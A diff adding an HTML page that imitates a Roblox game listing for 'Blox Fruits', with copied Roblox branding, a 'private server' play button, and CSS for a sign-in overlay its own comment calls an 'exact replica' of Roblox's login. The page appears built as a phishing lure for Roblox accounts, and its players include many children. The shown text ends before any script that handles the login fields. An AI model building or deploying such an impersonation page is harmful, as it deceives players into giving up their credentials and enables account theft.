@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Blox Fruits | Play on Roblox</title>
+<style>
+  :root{--ink:#191919;--muted:#666;--line:#e3e3e3;--blue:#006dff;--soft:#f7f7f8;}
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{background:#fff;color:var(--ink);font-family:"Source Sans Pro","Segoe UI",Arial,sans-serif;font-size:14px;-webkit-font-smoothing:antialiased;min-width:1344px;}
+  a{color:inherit;text-decoration:none;}
+  button,input,select{font-family:inherit;}
+
+  /* nav */
+  .nav{height:48px;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.12);display:flex;align-items:center;padding:0 24px;position:relative;z-index:20;}
+  .logo{width:118px;height:30px;flex:0 0 118px;background-repeat:no-repeat;background-size:118px 30px;background-position:center;cursor:pointer;}
+  .nav-links{display:flex;align-items:center;margin-left:18px;}
+  .nav-links a{font-size:14px;font-weight:700;padding:0 24px;line-height:48px;}
+  .nav-links a:first-child{padding-left:0;}
+  .search{width:334px;height:32px;background:#f2f2f2;border:1px solid #e0e0e0;border-radius:8px;display:flex;align-items:center;padding:0 12px;gap:8px;}
+  .search .ico{width:17px;height:17px;background-repeat:no-repeat;background-size:contain;opacity:.7;flex:0 0 17px;}
+  .search input{border:0;background:transparent;outline:0;font-size:14px;width:100%;padding:0;}
+  .nav-right{margin-left:auto;display:flex;align-items:center;gap:8px;}
+  .btn{height:30px;border-radius:8px;padding:0 14px;font-size:13px;font-weight:700;display:inline-flex;align-items:center;justify-content:center;cursor:pointer;border:1px solid transparent;}
+  .btn-primary{background:var(--blue);color:#fff;border-color:var(--blue);}
+  .btn-primary:hover{background:#005ce0;}
+  .btn-outline{background:#fff;color:var(--ink);border-color:#b8b8b8;}
+  .btn-outline:hover{background:#f7f7f7;}
+  .btn-ghost{background:#f2f2f2;border-color:#f2f2f2;}
+  .btn-ghost:hover{background:#e9e9e9;}
+
+  /* content */
+  .wrap{width:970px;margin:0 auto;}
+  .hero{display:flex;gap:18px;margin-top:16px;}
+  .hero-media{width:640px;flex:0 0 640px;position:relative;}
+  .hero-media img{width:640px;height:360px;object-fit:cover;display:block;border-radius:2px;background:#f0f0f0;}
+  .media-arrow{position:absolute;top:50%;transform:translateY(-50%);width:32px;height:32px;border:0;border-radius:50%;background:rgba(255,255,255,.85);box-shadow:0 1px 4px rgba(0,0,0,.25);cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:17px;color:#333;opacity:0;transition:opacity .15s;}
+  .hero-media:hover .media-arrow{opacity:1;}
+  .media-arrow.prev{left:10px;} .media-arrow.next{right:10px;}
+  .media-dots{position:absolute;bottom:12px;left:0;right:0;display:flex;justify-content:center;gap:7px;}
+  .media-dots span{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.55);cursor:pointer;}
+  .media-dots span.on{background:#fff;box-shadow:0 0 0 1px rgba(0,0,0,.25);}
+  .hero-info{flex:1;min-width:0;padding-top:0;}
+  .hero-info h1{font-size:28px;font-weight:700;margin:0;line-height:34px;}
+  .creator{font-size:14px;color:#191919;margin-top:6px;display:flex;align-items:center;gap:5px;}
+  .creator a{font-weight:600;}
+  .verified{width:16px;height:16px;display:inline-block;background-image:url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns=%27http://www.w3.org/2000/svg%27 width=%2728%27 height=%2728%27 viewBox=%270 0 28 28%27 fill=%27none%27%3E%3Cpath fill=%27%23006dff%27 d=%27M14 1.5 17.3 4l4.2-.2.6 4.1 3.4 2.5-1.6 3.9 1.6 3.9-3.4 2.5-.6 4.1-4.2-.2L14 26.5l-3.3-2.5-4.2.2-.6-4.1L2.5 17.7 4.1 14 2.5 10.1 6 7.6l.6-4.1 4.2.2z%27/%3E%3Cpath fill=%27white%27 d=%27m12 18-4-4 1.5-1.5L12 15l6.5-6.5L20 10z%27/%3E%3C/svg%3E');background-size:contain;background-repeat:no-repeat;}
+  .maturity-line{font-size:14px;color:#191919;margin-top:8px;}
+  .play-btn{width:300px;height:48px;background:var(--blue);border:0;border-radius:8px;color:#fff;display:flex;align-items:center;justify-content:center;margin-top:120px;cursor:pointer;transition:background .12s;}
+  .play-btn:hover{background:#005ce0;}
+  .play-btn svg{width:28px;height:28px;fill:#fff;}
+  .ratings{display:flex;gap:26px;margin-top:16px;}
+  .rating{display:flex;flex-direction:column;align-items:center;gap:5px;}
+  .rating .top{display:flex;align-items:center;gap:16px;height:20px;}
+  .rating .ico{width:20px;height:20px;background-repeat:no-repeat;background-size:contain;}
+  .rating .lbl{font-size:11px;color:#191919;}
+
+  /* tabs */
+  .tabs{display:flex;height:39px;background:var(--soft);margin-top:50px;border-bottom:2px solid var(--ink);}
+  .tab{flex:1;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:600;color:#191919;cursor:pointer;}
+  .tab.active{border-bottom:2px solid var(--ink);margin-bottom:-2px;}
+
+  /* panes */
+  .pane{display:none;} .pane.active{display:block;}
+  .about{padding-top:11px;}
+  .about h2{font-size:18px;font-weight:700;margin:0 0 10px;}
+  .desc{font-size:14px;line-height:1.48;color:#393b3d;margin:0;}
+  .rating-tags{display:flex;gap:8px;margin-top:16px;}
+  .rating-tags span{background:#f0f0f0;border-radius:8px;padding:8px 14px;font-weight:700;font-size:13px;}
+  .stats-grid{display:grid;grid-template-columns:repeat(9,1fr);gap:8px;margin-top:26px;padding:18px 0;border-top:1px solid var(--line);border-bottom:1px solid var(--line);}
+  .stat{text-align:center;}
+  .stat .k{font-size:11px;color:#555;margin-bottom:7px;white-space:nowrap;}
+  .stat .v{font-size:12px;font-weight:600;color:#191919;}
+  .report{text-align:right;color:#c82e2e;font-size:12px;text-decoration:underline;cursor:pointer;margin-top:12px;}
+  .about h2.section{font-size:18px;margin-top:48px;}
+  .badge-row{display:flex;gap:24px;background:var(--soft);border-radius:8px;padding:8px 14px;margin-bottom:12px;align-items:center;}
+  .badge-row img{width:150px;height:150px;border-radius:50%;flex:0 0 150px;}
+  .badge-body{flex:1;display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:20px;align-items:center;}
+  .badge-body h3{font-size:15px;margin:0 0 6px;font-weight:700;}
+  .badge-body p{font-size:13px;margin:0;color:#393b3d;}
+  .badge-body .small{font-size:12px;color:#555;margin-bottom:4px;}
+  .badge-body .big{font-size:15px;font-weight:700;}
+  .music h2{font-size:18px;margin:38px 0 16px;}
+  .music-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;}
+  .music-card img{width:100%;aspect-ratio:1/1;object-fit:cover;border-radius:8px;background:#eee;}
+  .music-card .t{font-size:12px;font-weight:700;margin-top:8px;line-height:1.2;}
+  .music-card .a{font-size:11px;color:#555;margin-top:3px;line-height:1.2;}
+
+  .store-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;padding-top:20px;}
+  .store-card{border:1px solid var(--line);border-radius:8px;overflow:hidden;cursor:pointer;}
+  .store-card img{width:100%;height:150px;object-fit:cover;display:block;background:#f0f0f0;}
+  .store-card .b{padding:12px;}
+  .store-card .b h4{margin:0;font-size:14px;}
+  .store-card .b p{margin:6px 0 0;font-size:12px;color:#555;}
+  .store-card .b .price{margin-top:10px;font-weight:700;color:var(--blue);}
+
+  .servers-pane{padding-top:20px;}
+  .servers-pane h2{font-size:18px;margin:0 0 12px;}
+  .server-mini{border:1px solid var(--line);border-radius:8px;padding:14px;display:flex;gap:14px;align-items:center;margin-bottom:10px;}
+  .server-mini img{width:80px;height:50px;object-fit:cover;border-radius:6px;}
+  .server-mini .info{flex:1;}
+  .server-mini .info b{font-size:14px;}
+  .server-mini .info span{display:block;color:#666;font-size:12px;margin-top:4px;}
+
+  /* footer */
+  .footer{margin-top:78px;border-top:1px solid #d4d4d4;padding:28px 0 26px;text-align:center;}
+  .footer-links{display:flex;justify-content:center;gap:24px;flex-wrap:wrap;}
+  .footer-links a{font-size:13px;color:#393b3d;font-weight:600;}
+  .footer-links a:hover{text-decoration:underline;}
+  .footer-rule{height:1px;background:#d4d4d4;margin:22px 0 16px;}
+  .copy{font-size:11px;color:#666;}
+  .privacy-ico{width:34px;height:14px;vertical-align:middle;}
+
+  /* ---------- Roblox sign-in overlay (exact replica) ---------- */
+  .login{position:fixed;inset:0;z-index:500;display:none;background:radial-gradient(circle,rgba(0,0,0,.5) 60%,rgba(0,0,0,.75) 100%),url('assets/login-bg.jpg') center/cover no-repeat;color:#f7f7f8;overflow:auto;}
+  .login.open{display:block;}
+  .login-nav{height:40px;background:#232527;display:flex;align-items:center;padding:0 20px;}
+  .login-nav .logo{width:118px;height:30px;flex:0 0 118px;background-size:118px 30px;background-repeat:no-repeat;}
+  .login-nav .nav-links{margin-left:18px;}
+  .login-nav .nav-links a{color:#f7f7f8;font-size:14px;padding:0 16px;}
+  .login-nav .search{background:rgba(255,255,255,.08);border-color:transparent;margin-left:6px;width:334px;height:28px;}
+  .login-nav .search input{color:#f7f7f8;}
+  .login-nav .search input::placeholder{color:#c4c4c4;}
+  .login-nav .btn-primary{height:26px;padding:0 12px;font-size:12px;}
+  .login-nav .btn-outline{height:26px;padding:0 12px;font-size:12px;background:transparent;color:#f7f7f8;border-color:#8b8b8b;}
+  .login-wrap{display:flex;flex-direction:column;align-items:center;padding-top:151px;}
+  .login-wordmark{width:186px;height:35px;background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=');background-size:contain;background-repeat:no-repeat;margin-bottom:-10px;}
+  .login-card{width:416px;background:#191a1f;border-radius:16px;padding:52px 16px 8px;}
+  .login-card h2{font-size:20px;margin:0 0 30px;color:#f7f7f8;}
+  .login-field{margin-bottom:16px;}
+  .login-field label{display:block;font-size:14px;font-weight:700;margin-bottom:6px;color:#f7f7f8;}
+  .login-input{width:384px;height:40px;border:1px solid #8b8b8b;border-radius:8px;display:flex;align-items:center;padding:0 12px;background:rgba(0,0,0,.15);}
+  .login-input input{border:0;outline:0;background:transparent;color:#f7f7f8;font-size:16px;width:100%;}
+  .login-input input::placeholder{color:#bcbcbc;}
+  .eye{cursor:pointer;font-size:15px;color:#d5d5d5;width:22px;text-align:center;}
+  .login-submit{width:384px;height:40px;border:0;border-radius:8px;background:rgba(208,217,251,.12);color:#f7f7f8;font-weight:700;font-size:14px;cursor:pointer;margin-top:8px;}
+  .login-submit:hover{background:rgba(208,217,251,.22);}
+  .forgot{display:block;font-size:12px;color:#d0d9fb;text-decoration:underline;margin:12px 0 18px;cursor:pointer;}
+  .or{text-align:center;font-size:11px;color:#bcbcbc;position:relative;margin:6px 0 18px;}
+  .or::before,.or::after{content:"";position:absolute;top:50%;left:0;right:calc(50% + 22px);height:1px;background:rgba(255,255,255,.14);}
+  .or::after{left:calc(50% + 22px);right:0;}
+  .login-alt{width:384px;height:40px;border:0;border-radius:8px;background:rgba(208,217,251,.12);color:#f7f7f8;font-weight:700;font-size:14px;cursor:pointer;margin-bottom:8px;display:flex;align-items:center;justify-content:center;gap:10px;}
+  .login-alt:not(:disabled):hover{background:rgba(208,217,251,.22);}
+  .login-alt:disabled{opacity:.55;cursor:not-allowed;}
+  .disabled-btn{opacity:.65;cursor:default;pointer-events:none;}
+  .disabled-text{cursor:default;opacity:.85;}
+  .signup-line{text-align:center;font-size:13px;font-weight:700;margin-top:20px;color:#f7f7f8;}
+  .signup-line a{text-decoration:underline;cursor:pointer;}
+
+  /* ---------- private server overlay ---------- */
+  .ps{position:fixed;inset:0;z-index:300;background:#1b1c20;color:#f7f7f8;display:none;overflow:auto;}
+  .ps.open{display:block;}
+  .ps-top{height:56px;background:#232527;border-bottom:1px solid rgba(255,255,255,.08);display:flex;align-items:center;padding:0 28px;gap:16px;}
+  .ps-top .ttl{font-size:18px;font-weight:700;}
+  .ps-top .sub{font-size:12px;color:#aaa;}
+  .ps-close{margin-left:auto;width:34px;height:34px;border-radius:8px;border:1px solid rgba(255,255,255,.2);background:transparent;color:#fff;cursor:pointer;font-size:18px;}
+  .ps-body{width:1200px;margin:0 auto;padding:28px 0 60px;display:grid;grid-template-columns:1fr 340px;gap:28px;}
+  .ps-panel{background:#26282d;border:1px solid rgba(255,255,255,.07);border-radius:14px;padding:20px;}
+  .ps-panel h3{margin:0 0 4px;font-size:17px;}
+  .ps-panel .hint{color:#a9a9ae;font-size:12px;margin:0 0 18px;}
+  .ps-tools{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap;}
+  .ps-tools input,.ps-tools select{height:34px;border-radius:8px;border:1px solid rgba(255,255,255,.16);background:#1b1c20;color:#fff;padding:0 10px;font-size:13px;outline:0;}
+  .ps-tools input{flex:1;min-width:180px;}
+  .ps-tools .btn{height:34px;}
+  .ps-btn-blue{background:var(--blue);color:#fff;border-color:var(--blue);border-radius:8px;padding:0 16px;font-size:13px;font-weight:700;cursor:pointer;border:1px solid transparent;}
+  .ps-btn-blue:hover{background:#005ce0;}
+  .ps-btn-gray{background:rgba(208,217,251,.12);color:#f7f7f8;border:0;border-radius:8px;padding:0 16px;font-size:13px;font-weight:700;cursor:pointer;}
+  .ps-btn-gray:hover{background:rgba(208,217,251,.22);}
+  .srv{display:flex;gap:14px;align-items:center;background:#2e3036;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:12px;margin-bottom:10px;}
+  .srv img{width:96px;height:54px;object-fit:cover;border-radius:6px;}
+  .srv-main{flex:1;min-width:0;}
+  .srv-main .n{font-weight:700;font-size:14px;display:flex;align-items:center;gap:8px;}
+  .dot{width:8px;height:8px;border-radius:50%;background:#35c759;display:inline-block;}
+  .srv-main .m{font-size:12px;color:#b9b9be;margin-top:5px;}
+  .tag{font-size:10px;border-radius:10px;padding:2px 8px;background:rgba(208,217,251,.14);color:#d0d9fb;}
+  .srv-enter{display:flex;flex-direction:column;align-items:flex-end;gap:6px;}
+  .srv-enter .ping{font-size:11px;color:#9a9aa0;}
+  .ps-form label{display:block;font-size:12px;font-weight:700;color:#c9c9ce;margin:14px 0 5px;}
+  .ps-form input,.ps-form select{width:100%;height:36px;border-radius:8px;border:1px solid rgba(255,255,255,.16);background:#1b1c20;color:#fff;padding:0 10px;font-size:13px;outline:0;}
+  .ps-form .ps-btn-blue{width:100%;height:38px;margin-top:20px;}
+  .ps-note{font-size:11px;color:#8e8e94;line-height:1.5;margin-top:16px;}
+
+  /* in game */
+  .ingame{position:fixed;inset:0;z-index:400;display:none;background:#0e1116;}
+  .ingame.open{display:block;}
+  .ig-bg{position:absolute;inset:0;background-size:cover;background-position:center;filter:brightness(.42) blur(1px);}
+  .ig-top{position:relative;display:flex;align-items:center;gap:18px;padding:14px 22px;background:linear-gradient(180deg,rgba(0,0,0,.65),transparent);}
+  .ig-badge{background:rgba(0,0,0,.55);border:1px solid rgba(255,255,255,.14);border-radius:8px;padding:8px 14px;font-size:13px;font-weight:700;}
+  .ig-badge span{color:#9ad1ff;}
+  .ig-exit{margin-left:auto;background:#c82e2e;border:0;border-radius:8px;color:#fff;font-weight:700;padding:9px 16px;cursor:pointer;font-size:13px;}
+  .ig-center{position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;height:calc(100% - 70px);}
+  .ig-center h2{font-size:44px;margin:0;text-shadow:0 4px 18px rgba(0,0,0,.8);letter-spacing:1px;}
+  .ig-center p{font-size:15px;color:#d9d9de;margin-top:10px;text-shadow:0 2px 8px #000;}
+  .ig-card{margin-top:26px;background:rgba(20,22,27,.86);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:18px 26px;display:flex;gap:28px;}
+  .ig-card div{text-align:center;}
+  .ig-card .k{font-size:11px;color:#9a9aa0;text-transform:uppercase;}
+  .ig-card .v{font-size:20px;font-weight:700;margin-top:5px;color:#9ad1ff;}
+  .ig-players{position:absolute;right:20px;top:78px;background:rgba(20,22,27,.8);border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:12px 16px;font-size:12px;min-width:170px;}
+  .ig-players b{display:block;margin-bottom:8px;}
+  .ig-chat{position:absolute;left:20px;bottom:20px;background:rgba(20,22,27,.78);border:1px solid rgba(255,255,255,.1);border-radius:10px;padding:12px 16px;font-size:12px;width:300px;}
+  .ig-chat .line{margin-bottom:5px;}
+  .ig-chat .line b{color:#9ad1ff;}
+  .ig-load{position:absolute;inset:0;background:#1b1c20;display:none;flex-direction:column;align-items:center;justify-content:center;gap:18px;}
+  .ig-load.open{display:flex;}
+  .ig-load h3{margin:0;font-size:24px;}
+  .ig-bar{width:340px;height:8px;background:rgba(255,255,255,.12);border-radius:8px;overflow:hidden;}
+  .ig-bar i{display:block;height:100%;width:0;background:var(--blue);transition:width .2s;}
+  .ig-load p{margin:0;color:#aaa;font-size:13px;}
+  .toast{position:fixed;left:50%;bottom:24px;transform:translateX(-50%);background:#191919;color:#fff;padding:10px 18px;border-radius:8px;font-size:13px;display:none;z-index:900;box-shadow:0 4px 18px rgba(0,0,0,.3);}
+</style>
+</head>
+<body>
+
+  <div class="nav">
+    <span class="logo" id="logo" title="Roblox" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMjAiIGhlaWdodD0iNjAiIGZpbGw9Im5vbmUiIHZpZXdCb3g9IjAgMCAzMjAgNjAiPjxwYXRoIGZpbGw9IiMzOTNiM2QiIGQ9Im0zOC41OCAzOC40MDQgOS4yMSAxNi44NTlIMzAuN2wtNy43NzctMTQuNDA3aC03LjM2OHYxNC40MDdIMFY0LjE5M2gyOC40NDljMTEuNzY4IDAgMTkuMjQgNi41MzIgMTkuMjQgMTguMjc4IDAgNy41NTgtMy40OCAxMi45NzItOS4xMSAxNS45MzNNMTUuNTU1IDE3LjQ2NnYxMC4xMTJoMTEuMDUyYzMuMjc0IDAgNS4zMi0xLjk0MSA1LjMyLTUuMTA3cy0yLjA0Ni01LjAwNS01LjMyLTUuMDA1em04MS42NjMgNDEuNTcxTDUwLjY1NiA0Ni40NzQgNjMuMTQxIDBsMjMuMjggNi4yODIgMjMuMjgxIDYuMjgxek04OC40MTcgMjQuODIgNzUuNDIgMjEuMjQ1bC0zLjQ4IDEyLjk3MiAxMi45OTcgMy41NzV6bTc0LjYwMiAxNi4wMzZjMCA5LjgwNS02LjI0MiAxNC40MDctMTUuOTY0IDE0LjQwN0gxMTYuNTZWNC4xOTNoMjkuNDcyYzkuNzIxIDAgMTUuOTYzIDUuMDA1IDE1Ljk2MyAxMy43ODkgMCA1LjUxNS0yLjA0NiA5LjE5My01LjkzNSAxMS43NDcgNC40MDEgMS45MzQgNi45NTkgNS44MTYgNi45NTkgMTEuMTI3TTEzMS43MDUgMTYuNDV2Ny41NThoMTAuMTI1YzIuNzYzIDAgNC40MDEtMS4yMjYgNC40MDEtMy44ODEgMC0yLjQ1Mi0xLjYzOC0zLjY3Ny00LjQwMS0zLjY3N3ptMCAyNi41NTZoMTEuMzU5YzIuNjYxIDAgNC4yMDEtMS40MyA0LjIwMS0zLjg4MyAwLTIuNjU0LTEuNTM1LTMuODgtNC4yMDEtMy44OGgtMTEuMzU5em0zOC45ODktMzguODEzaDE1LjU1MnYzNS45NDloMjIuMzA5djE1LjEyaC0zNy44NjN6bTk1LjA2OCAyNS41MzZjMCA1LjI1Mi0xLjU2IDEwLjM4Ny00LjQ4NCAxNC43NTRhMjYuNiAyNi42IDAgMCAxLTExLjk0IDkuNzggMjYuNjYgMjYuNjYgMCAwIDEtMTUuMzczIDEuNTEyIDI2LjYyIDI2LjYyIDAgMCAxLTEzLjYyMy03LjI2OCAyNi41MjEgMjYuNTIxIDAgMCAxLTUuNzY4LTI4Ljk0YzIuMDE0LTQuODUzIDUuNDI0LTkgOS44LTExLjkxOWEyNi42NCAyNi42NCAwIDAgMSAxNC43ODItNC40NzUgMjYuNTY1IDI2LjU2NSAwIDAgMSAxOC44MjcgNy43NiAyNi41IDI2LjUgMCAwIDEgNS43NjcgOC42MjEgMjYuNCAyNi40IDAgMCAxIDIuMDEyIDEwLjE3em0tMTUuNTU0IDBjMC02LjMzNC01LjAxNS0xMS4zMzktMTEuMDUyLTExLjMzOS02LjAzOCAwLTExLjA1MyA1LjAwNS0xMS4wNTMgMTEuMzM5czUuMDE1IDExLjMzNyAxMS4wNTMgMTEuMzM3YzYuMDM3IDAgMTEuMDUyLTUuMDEgMTEuMDUyLTExLjM0M3ptNTMuMDA4LS44MThMMzIwIDU1LjI2M2gtMTguNTI4bC05LjIwNS0xNS4wMi05LjUxNyAxNS4wMmgtMTguODNsMTcuNDk5LTI1Ljc0LTE2LjA2Ni0yNS4zM2gxOC41MjJsOC40OTQgMTMuNzg5IDguMTg3LTEzLjc4OWgxOC40MnoiLz48L3N2Zz4=')"></span>
+    <div class="nav-links">
+      <a href="https://www.roblox.com/charts">Charts</a><a href="https://www.roblox.com/marketplace">Marketplace</a><a href="https://create.roblox.com">Create</a><a href="https://www.roblox.com/robux">Robux</a>
+    </div>
+    <div class="search">
+      <span class="ico" style="background-image:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNiIgaGVpZ2h0PSIzNiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDM2IDM2Ij48cGF0aCBmaWxsPSIjMTIxMjEyIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0xNSA0LjEwOEE3LjgxIDcuODEgMCAwIDAgOC42MyAxLjM2Yy0yLjkzNC4xNDctNS4zNDggMS44MzgtNi42NTcgNC4yMzhhLjc1Ljc1IDAgMSAwIDEuMzE3LjcxOGMxLjA3OS0xLjk3OCAzLjA0My0zLjM0IDUuNDE2LTMuNDU4YTYuMzEgNi4zMSAwIDAgMSA1LjA4MSAyLjE0aC0xLjY4NmEuNzUuNzUgMCAwIDAgMCAxLjVIMTYuNVYyLjFhLjc1Ljc1IDAgMCAwLTEuNSAwek0xLjUgMTEuNTA2aDQuMzk5YS43NS43NSAwIDAgMSAwIDEuNWgtMS42OGE2LjMxIDYuMzEgMCAwIDAgNS4wNzUgMi4xMzNjMi4zODQtLjEyIDQuNDAxLTEuNDg4IDUuNDA4LTMuNDQyYS43NS43NSAwIDAgMSAxLjMzMy42ODdjLTEuMjQ5IDIuNDI0LTMuNzQyIDQuMTA3LTYuNjY2IDQuMjUzQTcuODEgNy44MSAwIDAgMSAzIDEzLjg4OXYyLjAxNmEuNzUuNzUgMCAwIDEtMS41IDB2LTQuNE0xMi41IDI1LjVhNSA1IDAgMSAxLTEwIDAgNSA1IDAgMCAxIDEwIDBNMSAyNS41YTYuNSA2LjUgMCAwIDAgMTAuNDM2IDUuMTczbDQuMDc1IDQuMDcyYS44Ny44NyAwIDAgMCAxLjIzNC0uMDAyLjg3Ni44NzYgMCAwIDAtLjAwMi0xLjIzN2wtNC4wNzEtNC4wNjhBNi41IDYuNSAwIDEgMCAxIDI1LjUiIGNsaXAtcnVsZT0iZXZlbm9kZCIvPjwvc3ZnPg==')"></span>
+      <input type="text" placeholder="Search" aria-label="Search">
+    </div>
+    <div class="nav-right">
+      <span class="btn btn-primary disabled-btn" aria-disabled="true">Sign Up</span>
+      <a class="btn btn-outline" id="loginLink" href="#">Log In</a>
+    </div>
+  </div>
+
+  <div class="wrap">
+    <div class="hero">
+      <div class="hero-media">
+        <img id="heroImg" src="assets/bf/hero_01.webp" alt="Blox Fruits">
+        <button class="media-arrow prev" id="mediaPrev">‹</button>
+        <button class="media-arrow next" id="mediaNext">›</button>
+        <div class="media-dots" id="mediaDots"></div>
+      </div>
+      <div class="hero-info">
+        <h1 id="gameTitle">Blox Fruits</h1>
+        <div class="creator">By <a id="creatorLink" href="https://www.roblox.com">Gamer Robot Inc</a> <i class="verified"></i></div>
+        <div class="maturity-line" id="maturityLine">Maturity: Mild</div>
+        <button class="play-btn" id="playBtn" title="Enter the private server">
+          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </button>
+        <div class="ratings">
+          <div class="rating"><div class="top">
+            <span class="ico" style="background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 28 28'%3E%3Cpath d='M14 2.5l3.1 6.4 7 1-5.1 4.9 1.2 7L14 18.8l-6.2 3 1.2-7-5.1-4.9 7-1z' fill='none' stroke='%23121212' stroke-width='2' stroke-linejoin='round'/%3E%3C/svg%3E&quot;);background-size:contain;"></span>
+          </div><div class="lbl">Favorite</div></div>
+          <div class="rating"><div class="top">
+            <span class="ico" style="background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 28 28'%3E%3Cpath d='M7 12h3.5v12H7zM11.5 12l4.2-8.5c.3-.6.9-1 1.6-1h2.2c1.1 0 2 1 1.8 2.1l-.8 5.4h5.1c1.3 0 2.2 1.2 1.8 2.4l-2.6 8.2c-.3.9-1.1 1.4-2 1.4H11.5z' fill='%23121212'/%3E%3C/svg%3E&quot;);background-size:contain;"></span>
+            <b id="likesLbl">12M+</b>
+            <span class="ico" style="background-image:url(&quot;data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='28' height='28' viewBox='0 0 28 28'%3E%3Cpath d='M7 12h3.5v12H7zM11.5 12l4.2-8.5c.3-.6.9-1 1.6-1h2.2c1.1 0 2 1 1.8 2.1l-.8 5.4h5.1c1.3 0 2.2 1.2 1.8 2.4l-2.6 8.2c-.3.9-1.1 1.4-2 1.4H11.5z' fill='%23121212'/%3E%3C/svg%3E&quot;);background-size:contain;transform:rotate(180deg)"></span>
+          </div><div class="lbl" id="dislikesLbl">1M+</div></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="tabs">
+      <div class="tab active" data-tab="about">About</div>
+      <div class="tab" data-tab="store">Store</div>
+      <div class="tab" data-tab="servers">Servers</div>
+    </div>
+
+    <div class="pane active" id="pane-about">
+      <div class="about">
+        <h2>Description</h2>
+        <p class="desc" id="desc"></p>
+        <div class="rating-tags" id="ratingTags"></div>
